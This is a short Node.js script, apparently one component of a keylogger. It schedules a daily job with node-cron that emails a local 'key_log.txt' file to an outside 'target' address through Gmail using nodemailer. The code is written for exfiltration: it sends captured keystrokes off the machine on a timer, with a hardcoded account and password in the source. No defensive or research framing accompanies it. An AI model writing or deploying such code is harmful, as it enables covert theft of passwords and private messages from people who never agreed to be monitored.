const nodemailer = require('nodemailer');
const cron = require('node-cron');
const fs = require('fs');

// Email credentials and settings
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'example@domain.com',
    pass: 'myPa55w0rd'
  }
});

const mailOptions = {
  from: 'example@domain.com',
  to: 'targetemail@domain.com',
  subject: 'Keylog',
  attachments: [{
    filename: 'key_log.txt',
    path: './key_log.txt'
  }]
};

// Schedule the task to run every 24 hours
cron.schedule('0 0 * * *', () => {
  // Send the email with the keylog file attached
  fs.readFile('./key_log.txt', (err, data) => {
    if (err) throw err;
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log(error);
      } else {
        console.log(`Keylog sent to ${mailOptions.to}`);
      }
    });
  });
});
